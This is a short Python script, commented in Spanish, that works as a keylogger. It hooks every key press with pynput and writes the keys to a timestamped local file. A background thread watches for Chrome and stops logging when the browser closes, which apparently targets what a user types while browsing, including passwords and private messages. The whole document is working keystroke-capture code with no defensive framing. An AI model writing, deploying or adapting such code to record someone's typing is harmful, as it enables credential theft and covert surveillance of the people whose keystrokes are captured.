import time
from pynput.keyboard import Listener 
import datetime
import psutil
import threading

archivo_abierto = True
archivo_lock = threading.Lock()

def is_chrome_running():
    for process in psutil.process_iter():
        try:
            if 'chrome' in process.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

def monitor_chrome():
    global archivo_abierto
    while True:
        time.sleep(5)  # Espera 5 segundos antes de verificar nuevamente
        if not is_chrome_running():
            with archivo_lock:
                archivo_abierto = False
                archivo.close()
            quit()

tiempo = datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S')
archivo = open(f'keylogger_{tiempo}.txt', 'w')

def registrar(llave):
    global archivo_abierto

    with archivo_lock:
        if not archivo_abierto:
            return False

        llave = str(llave)

        if llave == "'\\x03'":
            archivo.close()
            archivo_abierto = False
            return False
        elif llave == 'Key.enter':
            archivo.write('\n')
        elif llave == 'Key.space':
            archivo.write(' ')
        elif llave == 'Key.backspace':
            archivo.write('%BORRAR%')
        else:
            archivo.write(llave.replace("'", ""))

threading.Thread(target=monitor_chrome).start()

with Listener(on_press=registrar) as u:
    u.join()

    